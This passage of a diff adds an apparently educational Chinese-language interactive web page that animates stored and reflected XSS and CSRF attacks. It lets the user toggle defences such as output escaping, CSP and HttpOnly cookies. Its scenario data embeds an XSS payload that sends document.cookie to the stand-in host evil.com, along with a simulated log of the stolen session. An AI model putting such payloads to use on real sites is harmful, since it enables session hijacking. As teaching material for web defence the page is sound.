@@ -1,0 +1,1622 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS & CSRF 攻击原理</title>
+  <meta name="description" content="交互式演示 XSS 跨站脚本攻击与 CSRF 跨站请求伪造的原理、攻击流程与防御方案">
+  <meta name="keywords" content="XSS, CSRF, Web安全, 跨站脚本, 跨站请求伪造, 安全防御">
+  <meta property="og:title" content="XSS & CSRF 攻击原理">
+  <meta property="og:description" content="交互式演示 XSS 跨站脚本攻击与 CSRF 跨站请求伪造的原理、攻击流程与防御方案">
+  <meta property="og:type" content="website">
+  <link rel="icon" type="image/svg+xml" href="favicon.svg">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap"
+    rel="stylesheet">
+  <link rel="stylesheet" href="shared/nav.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    :root {
+      --bg-primary: #080b12;
+      --bg-card: #0f1319;
+      --bg-elevated: #161c26;
+      --bg-input: #0c1018;
+      --border: #1e2a3a;
+      --border-hover: #2d4a6f;
+      --text-primary: #e8edf5;
+      --text-secondary: #7d8da0;
+      --text-muted: #4a5568;
+      --accent-blue: #4da3ff;
+      --accent-green: #36d986;
+      --accent-purple: #b07aff;
+      --accent-orange: #ff9f43;
+      --accent-red: #ff5c6c;
+      --accent-red-rgb: 255, 92, 108;
+      --accent-cyan: #22d3ee;
+      --accent-pink: #f472b6;
+      --accent-orange-rgb: 255, 159, 67;
+      --glow-blue: rgba(77, 163, 255, 0.15);
+      --glow-green: rgba(54, 217, 134, 0.12);
+      --glow-purple: rgba(176, 122, 255, 0.12);
+      --radius: 14px;
+      --radius-sm: 8px;
+    }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
+      background: var(--bg-primary);
+      color: var(--text-primary);
+      height: 100vh;
+      overflow: hidden;
+    }
+
+    body::before {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background-image:
+        radial-gradient(ellipse at 20% 50%, rgba(77, 163, 255, 0.03) 0%, transparent 50%),
+        radial-gradient(ellipse at 80% 20%, rgba(176, 122, 255, 0.03) 0%, transparent 50%),
+        radial-gradient(ellipse at 50% 80%, rgba(54, 217, 134, 0.02) 0%, transparent 50%);
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    code,
+    pre,
+    .mono {
+      font-family: 'JetBrains Mono', 'Cascadia Code', 'Fira Code', monospace;
+    }
+
+    .app {
+      display: grid;
+      grid-template-columns: 280px 1fr;
+      grid-template-rows: 1fr 150px;
+      height: 100vh;
+      position: relative;
+      z-index: 1;
+    }
+
+    /* Sidebar */
+    .sidebar {
+      grid-row: 1/3;
+      background: var(--bg-card);
+      border-right: 1px solid var(--border);
+      overflow-y: auto;
+      padding: 18px 16px;
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+
+    .sidebar::-webkit-scrollbar {
+      width: 6px;
+    }
+
+    .sidebar::-webkit-scrollbar-track {
+      background: transparent;
+    }
+
+    .sidebar::-webkit-scrollbar-thumb {
+      background: var(--border);
+      border-radius: 3px;
+    }
+
+    .sidebar h2 {
+      font-size: 0.82rem;
+      font-weight: 700;
+      color: var(--text-primary);
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .sidebar h2::before {
+      content: '';
+      width: 3px;
+      height: 14px;
+      border-radius: 2px;
+      background: var(--accent-red);
+    }
+
+    .sidebar h3 {
+      font-size: 0.68rem;
+      color: var(--text-secondary);
+      font-weight: 500;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-bottom: 6px;
+    }
+
+    .sub {
+      font-size: 0.68rem;
+      color: var(--text-muted);
+      margin-top: 4px;
+    }
+
+    /* Attack cards */
+    .attack-cards {
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .attack-card {
+      padding: 10px 14px;
+      background: var(--bg-input);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-sm);
+      cursor: pointer;
+      transition: all 0.2s;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .attack-card::before {
+      content: '';
+      position: absolute;
+      left: 0;
+      top: 0;
+      bottom: 0;
+      width: 3px;
+      background: transparent;
+      border-radius: 0 2px 2px 0;
+      transition: background 0.2s;
+    }
+
+    .attack-card:hover {
+      border-color: var(--border-hover);
+    }
+
+    .attack-card.active {
+      border-color: var(--accent-blue);
+      background: linear-gradient(135deg, rgba(77, 163, 255, 0.08), rgba(77, 163, 255, 0.02));
+      box-shadow: 0 0 20px var(--glow-blue), inset 0 1px 0 rgba(77, 163, 255, 0.1);
+    }
+
+    .attack-card.active::before {
+      background: var(--accent-blue);
+    }
+
+    .attack-card .ac-name {
+      font-size: 0.74rem;
+      font-weight: 700;
+      color: var(--text-primary);
+    }
+
+    .attack-card .ac-desc {
+      font-size: 0.65rem;
+      color: var(--text-secondary);
+      margin-top: 3px;
+    }
+
+    /* Variant cards */
+    .variant-cards {
+      display: flex;
+      flex-direction: column;
+      gap: 5px;
+    }
+
+    .variant-card {
+      padding: 9px 12px;
+      background: var(--bg-input);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-sm);
+      cursor: pointer;
+      transition: all 0.2s;
+      font-size: 0.72rem;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .variant-card::before {
+      content: '';
+      position: absolute;
+      left: 0;
+      top: 0;
+      bottom: 0;
+      width: 3px;
+      background: transparent;
+      border-radius: 0 2px 2px 0;
+      transition: background 0.2s;
+    }
+
+    .variant-card:hover {
+      border-color: var(--border-hover);
+    }
+
+    .variant-card.active {
+      border-color: var(--accent-purple);
+      background: linear-gradient(135deg, rgba(176, 122, 255, 0.08), rgba(176, 122, 255, 0.02));
+      box-shadow: 0 0 16px var(--glow-purple);
+    }
+
+    .variant-card.active::before {
+      background: var(--accent-purple);
+    }
+
+    .variant-card .vc-name {
+      font-weight: 600;
+      color: var(--text-primary);
+    }
+
+    .variant-card .vc-desc {
+      font-size: 0.63rem;
+      color: var(--text-secondary);
+      margin-top: 3px;
+    }
+
+    /* Buttons */
+    .play-btn {
+      width: 100%;
+      padding: 10px;
+      border: none;
+      border-radius: var(--radius-sm);
+      cursor: pointer;
+      font-size: 0.82rem;
+      font-weight: 600;
+      transition: all 0.2s;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .play-btn::after {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(180deg, rgba(255, 255, 255, 0.1) 0%, transparent 50%);
+      pointer-events: none;
+    }
+
+    .play-btn:hover {
+      transform: translateY(-1px);
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+    }
+
+    .play-btn:active {
+      transform: translateY(0);
+    }
+
+    .play-btn.go {
+      background: linear-gradient(135deg, #c92a2a, #e03131);
+      color: #fff;
+    }
+
+    .play-btn.stop {
+      background: var(--bg-elevated);
+      color: var(--text-secondary);
+      border: 1px solid var(--border);
+    }
+
+    .play-btn.stop:hover {
+      background: #1e2a3a;
+      color: var(--text-primary);
+    }
+
+    .reset-btn {
+      width: 100%;
+      padding: 8px;
+      background: var(--bg-elevated);
+      border: 1px solid var(--border);
+      color: var(--text-secondary);
+      border-radius: var(--radius-sm);
+      cursor: pointer;
+      font-size: 0.72rem;
+      margin-top: 6px;
+      transition: all 0.2s;
+    }
+
+    .reset-btn:hover {
+      background: #1e2a3a;
+      color: var(--text-primary);
+      border-color: var(--border-hover);
+    }
+
+    .speed-row {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .speed-row input {
+      flex: 1;
+      accent-color: var(--accent-blue);
+    }
+
+    .speed-row span {
+      font-size: 0.72rem;
+      color: var(--text-secondary);
+      min-width: 30px;
+    }
+
+    /* Defense toggles */
+    .defense-toggle {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 9px 10px;
+      background: var(--bg-input);
+      border-radius: var(--radius-sm);
+      cursor: pointer;
+      border: 1px solid var(--border);
+      font-size: 0.72rem;
+      transition: all 0.2s;
+    }
+
+    .defense-toggle:hover {
+      border-color: var(--border-hover);
+    }
+
+    .defense-toggle .dt-switch {
+      width: 36px;
+      height: 20px;
+      background: var(--text-muted);
+      border-radius: 10px;
+      position: relative;
+      transition: all 0.2s;
+      flex-shrink: 0;
+    }
+
+    .defense-toggle .dt-switch::after {
+      content: '';
+      position: absolute;
+      top: 2px;
+      left: 2px;
+      width: 16px;
+      height: 16px;
+      background: var(--text-primary);
+      border-radius: 50%;
+      transition: all 0.2s;
+    }
+
+    .defense-toggle.on .dt-switch {
+      background: var(--accent-green);
+    }
+
+    .defense-toggle.on .dt-switch::after {
+      left: 18px;
+    }
+
+    /* Main area */
+    .main {
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+
+    .main-header {
+      padding: 12px 20px;
+      border-bottom: 1px solid var(--border);
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      background: linear-gradient(180deg, rgba(77, 163, 255, 0.04) 0%, transparent 100%);
+      flex-shrink: 0;
+    }
+
+    .main-header h3 {
+      font-size: 0.82rem;
+      font-weight: 700;
+      flex: 1;
+      background: linear-gradient(135deg, #fff 0%, #a8c8ff 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    .tag {
+      font-size: 0.65rem;
+      padding: 3px 10px;
+      border-radius: 10px;
+      font-weight: 600;
+      letter-spacing: 0.3px;
+    }
+
+    .sim-area {
+      flex: 1;
+      display: flex;
+      overflow: hidden;
+    }
+
+    /* Browser mockups */
+    .browser {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      border-right: 1px solid var(--border);
+      overflow: hidden;
+    }
+
+    .browser:last-child {
+      border-right: none;
+    }
+
+    .browser-bar {
+      padding: 7px 12px;
+      background: var(--bg-elevated);
+      border-bottom: 1px solid var(--border);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      flex-shrink: 0;
+    }
+
+    .browser-dots {
+      display: flex;
+      gap: 4px;
+    }
+
+    .browser-dots span {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+    }
+
+    .browser-url {
+      flex: 1;
+      background: var(--bg-input);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-sm);
+      padding: 4px 10px;
+      font-size: 0.65rem;
+      color: var(--text-secondary);
+      font-family: 'JetBrains Mono', 'Cascadia Code', monospace;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .browser-label {
+      font-size: 0.6rem;
+      font-weight: 600;
+      padding: 2px 8px;
+      border-radius: var(--radius-sm);
+      letter-spacing: 0.3px;
+    }
+
+    .browser-body {
+      flex: 1;
+      overflow-y: auto;
+      background: var(--bg-primary);
+    }
+
+    .browser-body::-webkit-scrollbar {
+      width: 6px;
+    }
+
+    .browser-body::-webkit-scrollbar-track {
+      background: transparent;
+    }
+
+    .browser-body::-webkit-scrollbar-thumb {
+      background: var(--border);
+      border-radius: 3px;
+    }
+
+    /* Simulated web page */
+    .web-page {
+      padding: 16px;
+    }
+
+    .web-page h4 {
+      font-size: 0.78rem;
+      margin-bottom: 8px;
+      font-weight: 700;
+      color: var(--text-primary);
+    }
+
+    .web-page .input-row {
+      display: flex;
+      gap: 6px;
+      margin-bottom: 10px;
+    }
+
+    .web-page input[type=text] {
+      flex: 1;
+      padding: 7px 10px;
+      background: var(--bg-input);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-sm);
+      color: var(--text-primary);
+      font-size: 0.72rem;
+      font-family: 'JetBrains Mono', 'Cascadia Code', monospace;
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+
+    .web-page input[type=text]:focus {
+      outline: none;
+      border-color: var(--accent-blue);
+      box-shadow: 0 0 0 3px var(--glow-blue);
+    }
+
+    .web-page .btn {
+      padding: 7px 14px;
+      border: none;
+      border-radius: var(--radius-sm);
+      cursor: pointer;
+      font-size: 0.72rem;
+      font-weight: 600;
+      position: relative;
+      overflow: hidden;
+      transition: all 0.2s;
+    }
+
+    .web-page .btn::after {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(180deg, rgba(255, 255, 255, 0.1) 0%, transparent 50%);
+      pointer-events: none;
+    }
+
+    .web-page .btn:hover {
+      transform: translateY(-1px);
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+    }
+
+    .web-page .btn-primary {
+      background: linear-gradient(135deg, #1a9f4a, #238636);
+      color: #fff;
+    }
+
+    .web-page .btn-danger {
+      background: linear-gradient(135deg, #c92a2a, #e03131);
+      color: #fff;
+    }
+
+    /* Comment box */
+    .comment-box {
+      background: var(--bg-elevated);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 12px;
+      margin-bottom: 8px;
+      font-size: 0.72rem;
+    }
+
+    .comment-box .cb-user {
+      color: var(--accent-blue);
+      font-weight: 600;
+      margin-bottom: 4px;
+      font-size: 0.68rem;
+    }
+
+    .comment-box .cb-text {
+      color: var(--text-primary);
+      line-height: 1.5;
+    }
+
+    .comment-box.injected {
+      border-color: var(--accent-red);
+      background: rgba(255, 92, 108, 0.06);
+    }
+
+    .comment-box.injected .cb-text {
+      color: var(--accent-red);
+    }
+
+    /* Cookie jar */
+    .cookie-jar {
+      background: var(--bg-elevated);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 12px;
+      margin-top: 10px;
+      font-size: 0.68rem;
+    }
+
+    .cookie-jar h5 {
+      color: var(--text-secondary);
+      margin-bottom: 6px;
+      font-size: 0.65rem;
+      text-transform: uppercase;
+      letter-spacing: 0.3px;
+    }
+
+    .cookie-jar .cookie {
+      color: var(--accent-orange);
+      font-family: 'JetBrains Mono', 'Cascadia Code', monospace;
+      padding: 2px 0;
+      font-size: 0.68rem;
+    }
+
+    .cookie-jar .cookie.stolen {
+      color: var(--accent-red);
+      text-decoration: line-through;
+    }
+
+    /* Network log */
+    .net-log {
+      background: var(--bg-elevated);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 12px;
+      margin-top: 10px;
+      font-size: 0.68rem;
+    }
+
+    .net-log h5 {
+      color: var(--text-secondary);
+      margin-bottom: 6px;
+      font-size: 0.65rem;
+      text-transform: uppercase;
+      letter-spacing: 0.3px;
+    }
+
+    .net-log .req {
+      padding: 4px 0;
+      font-family: 'JetBrains Mono', 'Cascadia Code', monospace;
+      font-size: 0.68rem;
+      border-bottom: 1px solid var(--border);
+      line-height: 1.5;
+    }
+
+    .net-log .req:last-child {
+      border-bottom: none;
+    }
+
+    .net-log .req.malicious {
+      color: var(--accent-red);
+    }
+
+    .net-log .req.blocked {
+      color: var(--accent-green);
+      text-decoration: line-through;
+    }
+
+    .net-log .method {
+      font-weight: 700;
+    }
+
+    .net-log .method.get {
+      color: var(--accent-blue);
+    }
+
+    .net-log .method.post {
+      color: var(--accent-orange);
+    }
+
+    /* Step narration */
+    .narration {
+      padding: 12px 18px;
+      border-top: 1px solid var(--border);
+      background: var(--bg-card);
+      flex-shrink: 0;
+      min-height: 60px;
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      backdrop-filter: blur(8px);
+    }
+
+    .narration .step-num {
+      background: var(--glow-blue);
+      color: var(--accent-blue);
+      padding: 3px 10px;
+      border-radius: var(--radius-sm);
+      font-size: 0.72rem;
+      font-weight: 700;
+      flex-shrink: 0;
+      margin-top: 2px;
+      font-family: 'JetBrains Mono', 'Cascadia Code', monospace;
+    }
+
+    .narration .step-text {
+      font-size: 0.76rem;
+      line-height: 1.6;
+      color: var(--text-primary);
+    }
+
+    .narration .step-text .highlight {
+      color: var(--accent-red);
+      font-weight: 600;
+    }
+
+    .narration .step-text .safe {
+      color: var(--accent-green);
+      font-weight: 600;
+    }
+
+    .narration .step-text code {
+      background: var(--bg-elevated);
+      border: 1px solid var(--border);
+      padding: 1px 6px;
+      border-radius: 4px;
+      font-size: 0.68rem;
+      color: var(--accent-orange);
+      font-family: 'JetBrains Mono', 'Cascadia Code', monospace;
+    }
+
+    /* Attacker server */
+    .attacker-log {
+      padding: 14px;
+      font-size: 0.72rem;
+    }
+
+    .attacker-log h4 {
+      color: var(--accent-red);
+      margin-bottom: 10px;
+      font-size: 0.78rem;
+      font-weight: 700;
+    }
+
+    .attacker-log .loot {
+      background: rgba(255, 92, 108, 0.06);
+      border: 1px solid rgba(255, 92, 108, 0.25);
+      border-radius: 10px;
+      padding: 10px;
+      margin-bottom: 8px;
+      font-family: 'JetBrains Mono', 'Cascadia Code', monospace;
+      font-size: 0.68rem;
+      color: var(--accent-red);
+      line-height: 1.5;
+    }
+
+    .attacker-log .loot.captured {
+      animation: pulse 0.5s;
+    }
+
+    @keyframes pulse {
+
+      0%,
+      100% {
+        opacity: 1;
+      }
+
+      50% {
+        opacity: 0.4;
+      }
+    }
+
+    /* Flow arrows overlay */
+    .flow-overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      pointer-events: none;
+      z-index: 5;
+    }
+
+    /* Prompt area */
+    .prompt-area {
+      background: var(--bg-card);
+      border-top: 1px solid var(--border);
+      padding: 14px 18px;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+
+    .prompt-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 8px;
+    }
+
+    .prompt-header h3 {
+      font-size: 0.68rem;
+      color: var(--text-secondary);
+      font-weight: 500;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .copy-btn {
+      padding: 5px 14px;
+      background: var(--bg-elevated);
+      border: 1px solid var(--border);
+      color: var(--text-secondary);
+      border-radius: var(--radius-sm);
+      cursor: pointer;
+      font-size: 0.72rem;
+      font-weight: 500;
+      transition: all 0.2s;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .copy-btn::after {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(180deg, rgba(255, 255, 255, 0.05) 0%, transparent 50%);
+      pointer-events: none;
+    }
+
+    .copy-btn:hover {
+      border-color: var(--accent-blue);
+      color: var(--text-primary);
+      box-shadow: 0 0 0 3px var(--glow-blue);
+    }
+
+    .copy-btn.copied {
+      background: linear-gradient(135deg, #1a9f4a, #238636);
+      border-color: transparent;
+      color: #fff;
+    }
+
+    .prompt-text {
+      flex: 1;
+      font-family: 'JetBrains Mono', 'Cascadia Code', monospace;
+      font-size: 0.68rem;
+      color: var(--text-secondary);
+      line-height: 1.7;
+      overflow-y: auto;
+      white-space: pre-wrap;
+    }
+
+    .prompt-text::-webkit-scrollbar {
+      width: 6px;
+    }
+
+    .prompt-text::-webkit-scrollbar-track {
+      background: transparent;
+    }
+
+    .prompt-text::-webkit-scrollbar-thumb {
+      background: var(--border);
+      border-radius: 3px;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="app">
+    <div class="sidebar">
+      <div>
+        <h2>XSS & CSRF 攻防</h2>
+        <p class="sub">交互式演示 · 理解攻击原理与防御手段</p>
+      </div>
+
+      <div>
+        <h3>攻击类型</h3>
+        <div class="attack-cards" id="attackCards"></div>
+      </div>
+
+      <div>
+        <h3>攻击变体</h3>
+        <div class="variant-cards" id="variantCards"></div>
+      </div>
+
+      <div>
+        <h3>防御措施</h3>
+        <div id="defenseToggles"></div>
+      </div>
+
+      <div>
+        <h3>动画速度</h3>
+        <div class="speed-row">
+          <span>慢</span>
+          <input type="range" min="0.5" max="3" step="0.5" value="1" id="speedSlider"
+            oninput="state.speed=+this.value;document.getElementById('speedVal').textContent=this.value+'x'">
+          <span id="speedVal">1x</span>
+        </div>
+      </div>
+
+      <div>
+        <button class="play-btn go" id="playBtn" onclick="togglePlay()">⚡ 发起攻击</button>
+        <button class="reset-btn" onclick="resetSim()">重置场景</button>
+      </div>
+    </div>
+
+    <div class="main">
+      <div class="main-header">
+        <h3 id="headerTitle">Stored XSS — Cookie 窃取</h3>
+        <span class="tag" id="headerTag"
+          style="background:rgba(var(--accent-red-rgb,248,81,73),0.19);color:var(--accent-red)">高危</span>
+        <span class="tag" id="defenseTag"
+          style="background:var(--bg-elevated);color:var(--text-muted);display:none">防御已开启</span>
+      </div>
+      <div class="sim-area" id="simArea"></div>
+      <div class="narration" id="narration">
+        <span class="step-num">0</span>
+        <div class="step-text">选择攻击类型和变体，然后点击「发起攻击」观看演示。</div>
+      </div>
+    </div>
+
+    <div class="prompt-area">
+      <div class="prompt-header">
+        <h3>生成的学习提示词</h3>
+        <button class="copy-btn" id="copyBtn" onclick="copyPrompt()">复制</button>
+      </div>
+      <div class="prompt-text" id="promptText"></div>
+    </div>
+  </div>
+
+  <script>
+    // ======================== DATA ========================
+    const ATTACKS = [
+      {
+        id: 'xss', name: 'XSS 跨站脚本', color: 'var(--accent-red)',
+        desc: '注入恶意脚本到网页中，在用户浏览器执行',
+        variants: [
+          {
+            id: 'stored', name: '存储型 XSS (Stored)', desc: '恶意脚本持久存储在服务器（如评论），所有访问者受害',
+            severity: 'critical', owasp: 'A03:2021'
+          },
+          {
+            id: 'reflected', name: '反射型 XSS (Reflected)', desc: '恶意脚本通过 URL 参数注入，需诱导用户点击',
+            severity: 'high', owasp: 'A03:2021'
+          },
+          {
+            id: 'dom', name: 'DOM 型 XSS (DOM-based)', desc: '恶意脚本通过前端 JS 直接操作 DOM 注入，不经过服务器',
+            severity: 'high', owasp: 'A03:2021'
+          },
+        ],
+        defenses: [
+          { id: 'escape', name: '输出编码 (HTML Escape)', desc: '将 < > " \' & 转义为 HTML 实体' },
+          { id: 'csp', name: 'Content-Security-Policy', desc: '限制脚本只能从可信源加载执行' },
+          { id: 'httponly', name: 'HttpOnly Cookie', desc: '阻止 JavaScript 读取 Cookie' },
+        ]
+      },
+      {
+        id: 'csrf', name: 'CSRF 跨站请求伪造', color: 'var(--accent-orange)',
+        desc: '伪造用户身份发起非预期请求',
+        variants: [
+          {
+            id: 'form', name: '表单自动提交', desc: '在恶意页面嵌入隐藏表单，自动提交到目标站点',
+            severity: 'high', owasp: 'A01:2021'
+          },
+          {
+            id: 'img', name: 'IMG 标签 GET 请求', desc: '利用 <img src="..."> 自动发起 GET 请求',
+            severity: 'medium', owasp: 'A01:2021'
+          },
+          {
+            id: 'ajax', name: '跨域 AJAX 请求', desc: '通过 JavaScript 发起跨域请求（受同源策略限制）',
+            severity: 'medium', owasp: 'A01:2021'
+          },
+        ],
+        defenses: [
+          { id: 'token', name: 'CSRF Token', desc: '在表单中嵌入随机 Token，服务端验证' },
+          { id: 'samesite', name: 'SameSite Cookie', desc: 'Cookie 设置 SameSite=Strict/Lax' },
+          { id: 'referer', name: 'Referer 校验', desc: '服务端验证请求来源域名' },
+        ]
+      },
+    ];
+
+    // ======================== SCENARIOS ========================
+    function buildScenario(attackId, variantId, defenses) {
+      const anyDefense = defenses.some(d => d.on);
+
+      if (attackId === 'xss' && variantId === 'stored') {
+        return buildStoredXSS(defenses);
+      } else if (attackId === 'xss' && variantId === 'reflected') {
+        return buildReflectedXSS(defenses);
+      } else if (attackId === 'xss' && variantId === 'dom') {
+        return buildDomXSS(defenses);
+      } else if (attackId === 'csrf' && variantId === 'form') {
+        return buildCSRFForm(defenses);
+      } else if (attackId === 'csrf' && variantId === 'img') {
+        return buildCSRFImg(defenses);
+      } else if (attackId === 'csrf' && variantId === 'ajax') {
+        return buildCSRFAjax(defenses);
+      }
+      return { browsers: [], steps: [] };
+    }
+
+    function buildStoredXSS(defenses) {
+      const escapeOn = defenses.find(d => d.id === 'escape')?.on;
+      const cspOn = defenses.find(d => d.id === 'csp')?.on;
+      const httpOnlyOn = defenses.find(d => d.id === 'httponly')?.on;
+      const blocked = escapeOn || cspOn;
+
+      const payload = `<script>fetch('https://evil.com/steal?c='+document.cookie)<\/script>`;
+      const escaped = `&lt;script&gt;fetch(&#39;https://evil.com/steal?c=&#39;+document.cookie)&lt;/script&gt;`;
+
+      return {
+        browsers: [
+          { id: 'attacker', label: '🔴 攻击者浏览器', url: 'https://bank.com/forum', color: 'var(--accent-red)' },
+          { id: 'server', label: '⚙️ 服务端 (bank.com)', url: 'bank.com 数据库 + 攻击者服务器', color: 'var(--text-secondary)' },
+          { id: 'victim', label: '🟢 受害者浏览器', url: 'https://bank.com/forum', color: 'var(--accent-green)' },
+        ],
+        steps: [
+          {
+            narration: '攻击者在论坛发帖，评论内容中嵌入恶意 <code>&lt;script&gt;</code> 标签。',
+            render(bs) {
+              bs.attacker = `<div class="web-page"><h4>💬 论坛发帖</h4>
+            <div class="comment-box"><div class="cb-user">attacker</div>
+            <div class="cb-text mono" style="font-size:11px;color:var(--accent-red);word-break:break-all">${esc(payload)}</div></div>
+            <div class="net-log"><h5>📤 发送请求</h5>
+            <div class="req malicious"><span class="method post">POST</span> /api/comments<br>body: { text: "${esc(payload).substring(0, 40)}..." }</div></div></div>`;
+            }
+          },
+          {
+            narration: escapeOn
+              ? '服务端对用户输入进行 <span class="safe">HTML 转义</span>，恶意标签被编码为纯文本存储。'
+              : '服务端<span class="highlight">未对输入做任何过滤或转义</span>，恶意脚本原样存入数据库。',
+            render(bs) {
+              bs.server = `<div class="attacker-log"><h4>📦 数据库存储</h4>
+            <div class="loot">${escapeOn ? `存储内容（已转义）：<br>${esc(escaped)}` : `存储内容（原样）：<br>${esc(payload)}`}</div>
+            ${escapeOn ? '<div style="color:var(--accent-green);font-size:12px">✅ 输出编码已启用，恶意标签被转义</div>' : '<div style="color:var(--accent-red);font-size:12px">⚠️ 无输入校验/输出编码</div>'}
+            </div>`;
+            }
+          },
+          {
+            narration: '受害者正常浏览论坛页面，浏览器向服务端请求帖子内容。',
+            render(bs) {
+              bs.victim = `<div class="web-page"><h4>💬 论坛页面</h4>
+            <div class="net-log"><h5>📥 请求页面</h5>
+            <div class="req"><span class="method get">GET</span> /forum/post/42</div></div>
+            <div class="cookie-jar"><h5>🍪 Cookie</h5>
+            <div class="cookie">session=abc123xyz${httpOnlyOn ? ' <span style="color:var(--accent-green)">[HttpOnly]</span>' : ''}</div></div></div>`;
+            }
+          },
+          {
+            narration: blocked
+              ? (escapeOn ? '服务端返回<span class="safe">转义后的内容</span>，浏览器将其渲染为纯文本，脚本不会执行。' : 'CSP 策略<span class="safe">阻止了内联脚本执行</span>，攻击被拦截。')
+              : '服务端返回包含恶意脚本的 HTML，浏览器解析时<span class="highlight">自动执行了注入的脚本</span>。',
+            render(bs) {
+              if (blocked) {
+                bs.victim = `<div class="web-page"><h4>💬 论坛页面</h4>
+              <div class="comment-box"><div class="cb-user">attacker</div>
+              <div class="cb-text" style="color:var(--text-secondary)">${escapeOn ? esc(payload) : '[脚本被 CSP 阻止]'}</div></div>
+              <div style="color:var(--accent-green);padding:8px;font-size:12px">${escapeOn ? '✅ 恶意标签显示为纯文本' : '✅ Content-Security-Policy 阻止了脚本执行'}<br>
+              ${cspOn ? '<code>Content-Security-Policy: script-src \'self\'</code>' : ''}</div></div>`;
+              } else {
+                bs.victim = `<div class="web-page"><h4>💬 论坛页面</h4>
+              <div class="comment-box injected"><div class="cb-user">attacker</div>
+              <div class="cb-text">⚡ 恶意脚本正在执行...</div></div>
+              <div class="cookie-jar"><h5>🍪 Cookie</h5>
+              <div class="cookie ${!httpOnlyOn ? 'stolen' : ''}">${!httpOnlyOn ? '⚠️ session=abc123xyz → 已被读取!' : 'session=abc123xyz [HttpOnly] — JS 无法读取'}</div></div>
+              <div class="net-log"><h5>📤 脚本发起的请求</h5>
+              <div class="req malicious"><span class="method get">GET</span> https://evil.com/steal?c=${!httpOnlyOn ? 'session=abc123xyz' : '[空]'}</div></div></div>`;
+              }
+            }
+          },
+          {
+            narration: blocked
+              ? '攻击<span class="safe">被成功防御</span>！防御措施阻止了恶意脚本的注入或执行。'
+              : httpOnlyOn
+                ? 'HttpOnly 标记使得脚本<span class="safe">无法读取 Cookie</span>，但攻击者仍可执行其他恶意操作（如键盘记录、页面篡改）。'
+                : '攻击者服务器<span class="highlight">成功接收到受害者的 Session Cookie</span>，可以冒充受害者身份。',
+            render(bs) {
+              if (blocked) {
+                bs.server = `<div class="attacker-log"><h4>🔴 攻击者服务器 (evil.com)</h4>
+              <div style="color:var(--accent-green);font-size:13px;padding:12px">🛡️ 未收到任何数据<br><br>攻击被防御措施拦截</div></div>`;
+              } else {
+                bs.server = `<div class="attacker-log"><h4>🔴 攻击者服务器 (evil.com)</h4>
+              <div class="loot captured">📥 收到请求:<br>GET /steal?c=${!httpOnlyOn ? 'session=abc123xyz' : '[空]'}<br>IP: 203.0.113.42 (受害者)</div>
+              ${!httpOnlyOn ? '<div style="color:var(--accent-red);font-size:12px;margin-top:8px">🎯 Session 已劫持！攻击者现在可以冒充受害者</div>' : '<div style="color:var(--accent-orange);font-size:12px;margin-top:8px">⚠️ Cookie 未泄露，但页面已被注入脚本</div>'}
+              </div>`;
+              }
+            }
+          },
+        ]
+      };
+    }
+
+    function buildReflectedXSS(defenses) {
+      const escapeOn = defenses.find(d => d.id === 'escape')?.on;
+      const cspOn = defenses.find(d => d.id === 'csp')?.on;
+      const blocked = escapeOn || cspOn;
+      const payload = `<script>alert(document.cookie)<\/script>`;
+      return {
+        browsers: [
+          { id: 'attacker', label: '🔴 攻击者', url: '构造恶意链接', color: 'var(--accent-red)' },
+          { id: 'server', label: '⚙️ 服务端 (bank.com)', url: 'bank.com/search', color: 'var(--text-secondary)' },
